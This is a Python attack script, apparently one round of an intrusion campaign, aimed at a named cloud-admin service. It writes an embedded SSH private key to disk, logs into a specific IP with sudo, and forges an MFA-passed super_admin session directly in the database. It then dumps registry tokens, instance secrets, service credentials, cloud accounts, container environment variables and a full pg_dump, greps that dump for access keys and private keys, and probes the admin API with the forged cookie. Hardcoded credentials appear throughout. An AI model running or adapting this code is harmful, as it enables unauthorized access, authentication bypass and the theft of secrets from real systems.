# -*- coding: utf-8 -*-
# intent 29581 round D: create super_admin session in lumii_cloud.admin_sessions, verify /v1/ops,
# dump DB secrets/registry/instances + full cloud container env, pg_dump grep zoofi.
import os,sys,base64,subprocess,json,re,time,hashlib,urllib.request,urllib.error
KEYB64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
open("/tmp/fk","wb").write(base64.b64decode(KEYB64)); os.chmod("/tmp/fk",0o600)
TOKEN=base64.urlsafe_b64encode(os.urandom(32)).rstrip(b"=").decode()
TH=hashlib.sha256(TOKEN.encode()).hexdigest()
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
def R(k,v,maxb=70000):
    try: s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    except Exception: s=repr(v)
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
def http(path,method="GET",origin=None,timeout=40,maxlen=5000):
    req=urllib.request.Request("https://cloud-admin.lumiiai.cn"+path,method=method)
    req.add_header("User-Agent",UA); req.add_header("Accept","application/json")
    req.add_header("Cookie","lumii_ops_session="+TOKEN)
    if origin: req.add_header("Origin",origin)
    try:
        r=urllib.request.urlopen(req,timeout=timeout); return {"code":r.getcode(),"body":r.read().decode("utf-8","replace")[:maxlen]}
    except urllib.error.HTTPError as e: return {"code":e.code,"body":e.read().decode("utf-8","replace")[:2000]}
    except Exception as e: return {"code":-1,"body":repr(e)}
SCRIPT = r"""
set +e
export PGPASSWORD='b24ebdd91c1c1d160992ce8b77d838a68b2647a9612d7c6f'
PSQL="psql -h 127.0.0.1 -U lumii_cloud -d lumii_cloud -P pager=off -At"
echo "@@@COLS"; $PSQL -F'|' -c "select table_name,column_name,data_type,column_default from information_schema.columns where table_schema='public' and table_name in ('admins','admin_sessions') order by table_name,ordinal_position"
Q1="select id from admins where status='active' and 'super_admin'=ANY(positions) and coalesce(must_change_password,false)=false order by created_at limit 1"
AID=$($PSQL -c "$Q1" 2>/dev/null)
[ -z "$AID" ] && AID=$($PSQL -c "select id from admins where status='active' and 'super_admin'=ANY(positions) order by created_at limit 1")
echo "@@@AID"; echo "$AID"; $PSQL -F'|' -c "select id,username,positions,status,created_at from admins where id='$AID'"
MYHASH="__HASH__"
$PSQL -c "delete from admin_sessions where token_hash='$MYHASH'"
$PSQL -c "insert into admin_sessions(token_hash,admin_id,mfa_passed,expires_at,created_at,last_seen_at) values('$MYHASH','$AID',true,now()+interval '12 hours',now(),now())" 2>&1 || $PSQL -c "insert into admin_sessions(token_hash,admin_id,mfa_passed,expires_at,created_at) values('$MYHASH','$AID',true,now()+interval '12 hours',now())" 2>&1
echo "@@@INS"; $PSQL -c "select admin_id,mfa_passed,expires_at from admin_sessions where token_hash='$MYHASH'"
echo "@@@TENANTDNS"; $PSQL -F'|' -c "select host,sub_domain,record_type,value,customer_id,instance_id,status from tenant_dns_records"
echo "@@@REG_ENT"; $PSQL -F'|' -c "select code,display_name,base_url,status,previous_code from registry.enterprises order by code"
echo "@@@REG_TOK"; $PSQL -F'|' -c "select id,code,enterprise_id,base_url,last_seen_at,revoked_at from registry.instance_tokens"
echo "@@@INSTANCES"; $PSQL -F'|' -c "select id,kind,name,base_url,status,accepting,customer_id,region,model_source,egress_ips,secret_enc,center_orgs,lifecycle from instances"
echo "@@@ESPROF"; $PSQL -F'|' -c "select enterprise_id,deployment_kind,region,model_source,center_spec,runtime_spec from enterprise_server_profiles"
echo "@@@PICKUPS"; $PSQL -F'|' -c "select approval_id,kind,enterprise_code,requested_by,sealed,token_expires_at,created_at from ops_secret_pickups"
echo "@@@SVCRE"; $PSQL -F'|' -c "select id,name,scopes,status,egress_ips,created_by from service_credentials"
echo "@@@ENTPROF"; $PSQL -F'|' -c "select enterprise_id,substr(profile::text,1,300) from enterprise_profiles"
echo "@@@AUDITSEC"; $PSQL -F'|' -c "select action,target_type,target_id,substr(detail::text,1,300) from audit_log where detail::text ~* 'secret|credential|password|token|cred_|provision|instance' order by at desc limit 25"
echo "@@@APPROV"; $PSQL -F'|' -c "select id,kind,target_type,target_id,status,substr(payload::text,1,300) from approvals order by requested_at desc limit 20"
echo "@@@CLOUDACCT"; $PSQL -F'|' -c "select substr(t::text,1,300) from cloud_accounts t order by 1 limit 25"
echo "@@@ENVDUMP"; for c in lumii-center-app-cloud-user-1 lumii-center-app-cloud-jobs-1 lumii-center-app-center-1; do echo "== $c =="; docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' $c 2>/dev/null | grep -viE '^(PATH|HOSTNAME|LANG|LC_|NODE_VERSION|YARN_VERSION|HOME|PWD|SHLVL|HOSTNAME|TERM|NODE_ENV)=' ; done
echo "@@@CLOUDLS"; ls -laR /data/lumii-cloud 2>/dev/null | head -60
echo "@@@PGDUMP"; pg_dump -h 127.0.0.1 -U lumii_cloud -d lumii_cloud --no-owner --no-privileges > /tmp/c.sql 2>/tmp/c.err; wc -c /tmp/c.sql; head -c 300 /tmp/c.err
echo "--zoofi hits--"; grep -aoE '.{0,70}(zoofi|wandfi|wand-index|0xC56f7063|0xFE18Aa1E|index origin).{0,70}' /tmp/c.sql | sort -u | head -40
echo "--secret-shaped hits--"; grep -aoE '.{0,50}(postgres://|mysql://|redis://|AKID[A-Za-z0-9]{20,}|LTAI[A-Za-z0-9]{10,}|AKIA[A-Z0-9]{12,}|-----BEGIN).{0,60}' /tmp/c.sql | sort -u | head -25
echo "@@@DISKZOOFI"; timeout 120 grep -rlaE 'zoofi|wandfi|wand-index|0xC56f7063|0xFE18Aa1E' /data/lumii-cloud /data/lumii-shared/app/src/cloud /data/lumii-shared/app/deploy /opt/lumii-ops 2>/dev/null | grep -viE 'node_modules|/\.git/' | head -30
echo "@@@DONE"
"""
SCRIPT=SCRIPT.replace("__HASH__",TH)
def run(cmd,timeout=500):
    try:
        p=subprocess.run(cmd,input=SCRIPT.encode(),capture_output=True,timeout=timeout); return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)
a=["ssh","-i","/tmp/fk","-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=15","-o","IdentitiesOnly=yes","ubuntu@43.143.107.214","sudo -n bash -s"]
rc,o,e=run(a,timeout=520)
R("meta",{"rc":rc,"err":e[-300:],"outlen":len(o)})
parts=re.split(r'@@@([A-Z0-9_]+)',o)
for i in range(1,len(parts),2):
    R(parts[i].lower(), parts[i+1] if i+1<len(parts) else "")
R("token",TOKEN)
# verify session + super_admin APIs
R("api_me",http("/v1/ops/me"))
R("api_admins",http("/v1/ops/admins"))
R("api_regent",http("/v1/ops/registry/enterprises"))
R("api_instances",http("/v1/ops/provision-jobs"))
R("api_svccred",http("/v1/ops/service-credentials"))
R("api_origin_post",http("/v1/ops/admins","POST","https://cloud-admin.lumiiai.cn"))
R("done",{"t":int(time.time())})
